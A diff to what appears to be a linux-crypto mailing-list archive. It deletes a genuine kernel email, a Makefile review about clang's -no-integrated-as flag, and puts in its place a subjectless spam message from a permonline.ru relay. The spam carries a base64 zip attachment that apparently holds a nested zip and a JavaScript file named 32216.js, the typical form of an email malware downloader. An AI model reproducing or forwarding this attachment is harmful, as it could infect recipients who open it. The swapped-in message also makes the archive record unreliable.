@@ -1,75 +1,58 @@
-From: Masahiro Yamada <yamada.masahiro@socionext.com>
-Subject: Re: [PATCH 1/7] Makefile, LLVM: add -no-integrated-as to KBUILD_[AC]FLAGS
-Date: Fri, 21 Apr 2017 16:49:53 +0900
-Message-ID: <CAK7LNAS0i=Qtoqk3hZMhAyQOXWf-8=fb0bSMh=gMJ3-bunQ_5Q@mail.gmail.com>
-References: <20170317001520.85223-1-md@google.com> <20170317001520.85223-2-md@google.com>
+From: <delaware.orders@nationalcorp.com>
+Subject: (unknown)
+Date: Fri, 21 Apr 2017 09:25:54 -0000
+Message-ID: <149276675477.20066.7821933296605077790@permonline.ru>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=UTF-8
-Cc: Michal Marek <mmarek@suse.com>,
-        Thomas Gleixner <tglx@linutronix.de>,
-        Ingo Molnar <mingo@redhat.com>,
-        "H. Peter Anvin" <hpa@zytor.com>,
-        Herbert Xu <herbert@gondor.apana.org.au>,
-        "David S. Miller" <davem@davemloft.net>,
-        Shaohua Li <shli@kernel.org>,
-        Alexander Potapenko <glider@google.com>,
-        Dmitry Vyukov <dvyukov@google.com>,
-        Matthias Kaehlcke <mka@chromium.org>, X86 ML <x86@kernel.org>,
-        Linux Kbuild mailing list <linux-kbuild@vger.kernel.org>,
-        Linux Kernel Mailing List <linux-kernel@vger.kernel.org>,
-        linux-crypto@vger.kernel.org, linux-raid@vger.kernel.org
-To: Michael Davidson <md@google.com>
-Return-path: <linux-kernel-owner@vger.kernel.org>
-In-Reply-To: <20170317001520.85223-2-md@google.com>
-Sender: linux-kernel-owner@vger.kernel.org
-List-Id: linux-crypto.vger.kernel.org
+Content-Type: application/zip; name="EMAIL_4680172734_linux-crypto.zip"
+Content-Transfer-Encoding: base64
+To: "linux-crypto" <linux-crypto@vger.kernel.org>
+Return-path: <linux-crypto-owner@vger.kernel.org>
+Received: from 90.150.127.74.permonline.ru ([90.150.127.74]:36596 "HELO
+        permonline.ru" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org
+        with SMTP id S1036921AbdDUJ0A (ORCPT
+        <rfc822;linux-crypto@vger.kernel.org>);
+        Fri, 21 Apr 2017 05:26:00 -0400
+Subject: 
+Content-Disposition: attachment
+Sender: linux-crypto-owner@vger.kernel.org
+List-ID: <linux-crypto.vger.kernel.org>
 
-Hi Michael,
-
-
-2017-03-17 9:15 GMT+09:00 Michael Davidson <md@google.com>:
-> Add -no-integrated-as to KBUILD_AFLAGS and KBUILD_CFLAGS
-> for clang.
-
->From the code-diff, it is apparent that
-you added -no-integrated-as.
-
-Rather, I'd like to see "why" in the git-log.
-
-Obviously, clang needs this patch to build the kernel,
-but can you describe the reason why the integrated assembler is bad?
-
-With git-log reworded, I will pick up this shortly.
-
-Thanks!
-
-
-
-> Signed-off-by: Michael Davidson <md@google.com>
-> ---
->  Makefile | 2 ++
->  1 file changed, 2 insertions(+)
->
-> diff --git a/Makefile b/Makefile
-> index b841fb36beb2..b21fd0ca2946 100644
-> --- a/Makefile
-> +++ b/Makefile
-> @@ -704,6 +704,8 @@ KBUILD_CFLAGS += $(call cc-disable-warning, tautological-compare)
->  # See modpost pattern 2
->  KBUILD_CFLAGS += $(call cc-option, -mno-global-merge,)
->  KBUILD_CFLAGS += $(call cc-option, -fcatch-undefined-behavior)
-> +KBUILD_CFLAGS += $(call cc-option, -no-integrated-as)
-> +KBUILD_AFLAGS += $(call cc-option, -no-integrated-as)
->  else
->
->  # These warnings generated too much noise in a regular build.
-
-
-
-
-
-
-
--- 
-Best Regards
-Masahiro Yamada
+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
+utIBUEsFBgAAAAABAAEAWwAAAB4IAAAAAA==
